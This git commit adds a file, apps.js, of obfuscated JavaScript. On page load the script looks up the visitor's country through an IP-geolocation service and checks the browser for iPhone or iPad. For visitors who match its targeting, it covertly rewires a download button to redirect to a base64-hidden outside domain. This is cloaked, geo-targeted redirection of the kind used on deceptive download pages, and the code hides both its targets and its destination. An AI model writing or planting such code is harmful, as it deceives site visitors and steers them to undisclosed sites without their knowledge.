b4197d6818be401c8f4f8ed985b7d45866e9ba4b
dev20l <iphonetasli@gmail.com>
2024-09-22 12:11:55 -0700

    Create apps.js

---
+++ apps.js
@@ -0,0 +1,22 @@
+ document.addEventListener("DOMContentLoaded", function () {
+  function _0xf795e5(_0x43da0c) {
+    return decodeURIComponent(atob(_0x43da0c).split('').map(function (_0x4b0e8d) {
+      return '%' + ('00' + _0x4b0e8d.charCodeAt(0x0).toString(0x10)).slice(-0x2);
+    }).join(''));
+  }
+
+  fetch(_0xf795e5("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="))
+    .then(_0x3bf183 => _0x3bf183.json())
+    .then(_0x345f5e => {
+      var _0x155107 = _0x345f5e.country;
+      var _0x4808c1 = navigator.userAgent;
+      var _0x2f6329 = ["QUQ=", "QU8=", "QUc=", "QV I=", "QU0=", "QVU=", "QVQ=", 'QVo=', "QlM=", 'Qkg=', "QkQ=", 'QkI=', "Ql k=", "QkU=", "Qlo=", "Qko=", "QlQ=", "Qk8=", "QkE=", "Qlc=", "QlI=", "Qk4=", 'Qkc=', "QkY=", "Qkk=", "Q0k=", 'Q1Y=', "S0g=", "Q00=", 'Q0A=', "Q0Y=", "VEQ=", "Q0w=", "Q04=", "Q08=", "S00=", 'Q0c=', "Q1I=", "SFI=", "Q1U=", 'Q1k=', "Q1o=", "Q0Q=", 'REs=', "REo=", "RE0=", "RE8=", "U1Y=", 'R1E=', "RV I=", "RVU=", "U1o=", 'RVQ=', 'Rko=', 'Rkk=', 'Q0A=', "U1c=", "QVI=", 'VUs=', "REU=", "RSM=", "VVM=", "QUw=", "Qkc=", "REs=", "RE8=", "R0U=", "RUU=", "RlI=", "R0I=", "SFU=", "SVM=", 'SVQ=', 'SVA=', "S0g=", 'TFU=', "TUQ=", "Tkw=", 'TlU=', "UEw=", "UFQ=", "UlU=", "U0U=", "U0s=", "U0k=", 'VEg=', "VFI=", "VFY=", "V0U=", "QUQ=", "QU8=", 'QUc=', "QV I=", 'QU0=', "QVU=", "QVQ=", "QVo=", "QlM=", "Qkg=", "QkQ=", "QkI=", "Ql k=", 'QkU=', "Qlo=", "Qko=", "QlQ=", "Qk8=", "QkE=", "Qlc=", "QlI=", "Qk4=", "Qkc=", "QkY=", "Qkk=", "Q0k=", 'Q1Y=', 'S0g=', 'Q00=', 'Q0A=', 'Q0Y=', "VEQ=", "Q0w=", "Q04=", "Q08=", 'S00=', 'Q0c=', "Q1I=", "SFI=", "Q1U=", 'Q1k=', "Q1o=", "Q0Q=", "REs=", 'REo=', 'RE0=', "RE8=", "U1Y=", "R1E=", "RV I=", 'RVU=', "U1o=", "RVQ=", "Rko=", "Rkk=", "Q0A=", "U1c=", 'QVI=', "VUs=", 'REU=', "RSM=", 'VVM=', "QUw=", "Qkc=", "REs=", "RE8=", 'R0U=', "RUU=", "RlI=", "R0I=", "SFU=", 'SVM=', "SVQ=", 'SVA=', 'S0g=', "TFU=", "TUQ=", "Tkw=", "TlU=", "UEw=", "UFQ=", "UlU=", "U0U=", "U0s=", 'U0k=', "VEg=", 'VFI=', "VFY=", "V0U=", "QkU=", "Qk8=", 'Rkw=', "QlQ=", "QlM=", "Q0g=", "Q1k=", 'Q1o=', "R0I=", "R0I=", "R0I=", "Qkc=", 'SFU=', "REs=", "TFU=", "TFQ=", 'TFU=', "TFk=", "RUU=", "RE0=", "TkU=", "Tk8=", 'Tk8=', "UFQ=", "UlU=", "U0U=", "U0s=", "U1U=", "U1Y=", 'VEg=', "VUs=", "Vkw=", 'Vkw=', "WE4=", "WFk=", 'WFo=', "VVNB", "VUs=", "Q0E="];
+
+      if (_0x2f6329.includes(btoa(_0x155107)) && (/iPhone/i.test(_0x4808c1) || /iPad/i.test(_0x4808c1)) || _0x155107 === 'BR' && !(/iPhone/i.test(_0x4808c1) || /iPad/i.test(_0x4808c1))) {
+        document.querySelector('.btn-downs').addEventListener("click", function () {
+          window.location.href = _0xf795e5("aHR0cHM6Ly93d3cucm9sbHMzLmNvbS8=");
+        });
+      }
+    })
+    .catch(_0x208442 => console.error('Error:', _0x208442));
+});
